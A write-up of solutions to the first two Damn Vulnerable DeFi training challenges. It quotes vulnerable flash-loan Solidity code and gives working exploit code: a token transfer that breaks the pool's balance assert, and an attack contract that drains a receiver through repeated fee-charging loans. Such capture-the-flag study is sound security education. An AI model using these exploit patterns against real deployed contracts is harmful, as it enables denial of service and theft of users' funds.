![](cover.png)

# Damn Vulnerable DeFi solutions (v2)

Challenges created by [@tinchoabbate](https://twitter.com/tinchoabbate) at [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/).

## #1 - Unstoppable

The goal of this challenge is to disable flash loan lender contract. We are looking for DoS attack.

Vulnerability is located inside **flashLoan()** function in **UnstoppableLender.sol** :

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
  require(borrowAmount > 0, "Must borrow at least one token");

  uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
  require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

  // Ensured by the protocol via the `depositTokens` function
  assert(poolBalance == balanceBefore);

  damnValuableToken.transfer(msg.sender, borrowAmount);

  IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

  uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
  require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

In order to disable contract from offering flash loans, we need to break one of the 4 safety checks inside the function.

Particiullary interesting one:

```solidity
// Ensured by the protocol via the `depositTokens` function
assert(poolBalance == balanceBefore);
```

The assert statement is making sure that contract balance of DVT token (`balanceBefore`) is matching the inner contract logic balance (`poolBalance`) that is updated when user deposits tokens using `depositTokens` function.

It assumes that no external transfers will occur, which is a flawed assumption.

We can exploit this by transferring DVT tokens to contract with ERC20 `transfer` function.

Solution code:

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  await this.token
    .connect(attacker)
    .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
// ...
```

## #2 - Naive Receiver

This challange might be tricky at first. Goal is not to attack lender, rather we need to drain funds from receiver even though vulnerability is inside lender's contract.

**NaiveReceiverLenderPool.sol** is offering flash loans, but it always takes constant fee of **1 ether**.
There is nothing wrong with contract's logic, but the way it offers flash loans is not very secure.

As we can see from `flashLoan()` function:

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

    require(borrower.isContract(), "Borrower must be a deployed contract");
    // Transfer ETH and handle control to receiver
    borrower.functionCallWithValue(
        abi.encodeWithSignature(
            "receiveEther(uint256)",
            FIXED_FEE
        ),
        borrowAmount
    );

    require(
        address(this).balance >= balanceBefore + FIXED_FEE,
        "Flash loan hasn't been paid back"
    );
}
```

It's clear that caller is specifying address of borrower as paramater. So, we can call `flashLoan()` and specify **flashLoanReceiver.sol**'s address as borrower, calling it 10 times would be enough to drain all funds from receiver since 1 loan costs 1 ether in fees.

We will make new **NaiveReceiverAttack.sol** contract that will essentially call `flashLoan()` 10 times with **flashLoanReceiver.sol**'s address as borrower paramater.

Solution code:

**NaiveReceiverAttack.sol :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool immutable pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) external {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}

```

**naive-receiver.challenge.js :**

```js
// ...
it('Exploit', async function () {
  /** CODE YOUR EXPLOIT HERE */
  const AttackFactory = await ethers.getContractFactory(
    'NaiveReceiverAttack',
    attacker
  );
  const attackContract = await AttackFactory.deploy(this.pool.address);
  await attackContract.attack(this.receiver.address);
});
// ...
```
